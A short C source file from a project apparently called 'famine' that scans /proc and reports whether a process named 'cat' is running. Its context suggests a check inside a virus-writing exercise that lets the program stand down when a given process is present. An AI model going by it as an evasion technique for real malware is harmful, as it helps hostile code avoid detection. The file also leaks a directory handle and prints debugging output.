//
// Created by Joris GOUNAND on 11/8/19.
//

#include "../inc/famine.h"

bool process_runing(void)
{
	DIR* dir;
	struct dirent* ent;
	char* endptr;
	char buf[256];
	const char name[] = "cat";

	if (!(dir = opendir("/proc"))) {
		perror("can't open /proc");
		return 1;
	}
	while((ent = readdir(dir)) != NULL) {
		/* if endptr is not a null character, the directory is not
		 * entirely numeric, so ignore it */
		long lpid = strtol(ent->d_name, &endptr, 10);
		if (*endptr != '\0') {
			continue;
		}

		/* try to open the cmdline file */
		snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
		FILE* fp = fopen(buf, "r");

		if (fp) {
			if (fgets(buf, sizeof(buf), fp) != NULL) {
				/* check the first token in the file, the program name */
				char* first = strtok(buf, " ");
				printf("name %s\n",first);
				if (!strcmp(first, name)) {
					fclose(fp);
					closedir(dir);
					return (1);
				}
			}
			fclose(fp);
		}

	}
	return (0);
}